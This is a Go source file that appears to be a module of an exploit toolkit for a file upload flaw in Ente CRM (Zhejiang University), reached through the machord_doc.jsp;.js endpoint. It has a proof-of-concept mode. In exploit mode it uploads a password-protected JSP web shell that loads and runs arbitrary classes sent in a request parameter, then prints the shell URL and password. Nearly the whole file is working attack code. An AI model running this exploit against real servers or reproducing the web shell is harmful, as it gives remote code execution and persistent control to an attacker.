package vulnerable

import (
	"bytes"
	"compress/gzip"
	"errors"
	"fmt"
	"github.com/thanhpk/randstr"
	"io/ioutil"
	"mime/multipart"
	"net/http"
	"strings"
)

func MachordDocApiFileupload(mode, target, proxyAddr string) {
	Password := randstr.Hex(8)
	filename := randstr.Hex(8) + ".jsp"
	if mode == strings.ToLower("poc") {
		ShellStr = "浙大恩特CRM系统[/entsoft_en/Storage/machord_doc.jsp;.js?formID=upload&machordernum=&fileName=]文件上传漏洞验证测试"
	} else if mode == strings.ToLower("exp") {
		ShellStr = "<%!\nclass HYPERLINK extends ClassLoader{\n  HYPERLINK(ClassLoader c){super(c);}\n  public Class snake_case(byte[] b){\n    return super.defineClass(b, 0, b.length);\n  }\n}\npublic byte[] manipulator(String str) throws Exception {\n  Class base64;\n  byte[] value = null;\n  try {\n    base64=Class.forName(\"sun.misc.BASE64Decoder\");\n    Object decoder = base64.newInstance();\n    value = (byte[])decoder.getClass().getMethod(\"decodeBuffer\", new Class[] {String.class }).invoke(decoder, new Object[] { str });\n  } catch (Exception e) {\n    try {\n      base64=Class.forName(\"java.util.Base64\");\n      Object decoder = base64.getMethod(\"getDecoder\", null).invoke(base64, null);\n      value = (byte[])decoder.getClass().getMethod(\"decode\", new Class[] { String.class }).invoke(decoder, new Object[] { str });\n    } catch (Exception ee) {}\n  }\n  return value;\n}\n%>\n<%\nString cls = request.getParameter(\"" + Password + "\");\nif (cls != null) {\n  new HYPERLINK(this.getClass().getClassLoader()).snake_case(manipulator(cls)).newInstance().equals(new Object[]{request,response});\n}\n%>"
		urls, err := getShell(target, filename, ShellStr, proxyAddr)
		if err == nil {
			fmt.Println(urls, Password)
			return
		}
	}
	url, err := getShell(target, filename, ShellStr, proxyAddr)
	if err == nil {
		resp, _ := http.Get(url)
		defer func() { _ = resp.Body.Close() }()
		if resp.StatusCode != http.StatusOK {
			fmt.Println("站点不存在[machord_doc.jsp]漏洞")
			return
		}
		all, _ := ioutil.ReadAll(resp.Body)
		if strings.Contains(string(all), ShellStr) == true {
			fmt.Printf("站点存在此漏洞,Shell页面显示\n%s\n", all)
		}
	}

}

func getShell(targetHost, filename, ShellContent, proxy string) (shellURL string, err error) {
	cli := HttpCli(proxy)
	buffer := &bytes.Buffer{}
	writer := multipart.NewWriter(buffer)
	field, _ := writer.CreateFormField("oprfilenam")
	_, _ = field.Write([]byte("null"))
	formField, _ := writer.CreateFormField("uploadflg")
	_, _ = formField.Write([]byte("0"))
	_, _ = writer.CreateFormField("strAffixStr")
	_, _ = writer.CreateFormField("selfilenam")
	file, _ := writer.CreateFormFile("uploadfile", filename)
	_, _ = file.Write([]byte(ShellContent))
	_ = writer.Close()
	host := targetHost + "/entsoft_en/Storage/machord_doc.jsp;.js?formID=upload&machordernum=&fileName=" + filename + "&strAffixStr=&oprfilenam=null&gesnum="
	host = strings.Replace(host, "//ent", "/ent", 1)
	request, _ := http.NewRequest(http.MethodPost, host, strings.NewReader(buffer.String()))
	request.Header.Set("Content-Type", writer.FormDataContentType())
	request.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) QAXNB/20100101 Firefox/112.0")
	request.Header.Set("Accept-Encoding", "gzip, deflate")
	do, err := cli.Do(request)
	if err != nil {
		fmt.Println(err)
	}
	defer func() { _ = do.Body.Close() }()
	if do.StatusCode != http.StatusOK {
		return "", errors.New("传了个寂寞")
	}
	reader, _ := gzip.NewReader(do.Body)
	all, _ := ioutil.ReadAll(reader)
	if strings.Contains(string(all), filename) == true {
		jspshellURL := targetHost + "/enterdoc/Machord/" + filename
		jspshellURL = strings.Replace(jspshellURL, "//ent", "/ent", 1)
		return jspshellURL, nil
	} else {
		return "", errors.New("传了个寂寞")
	}

}
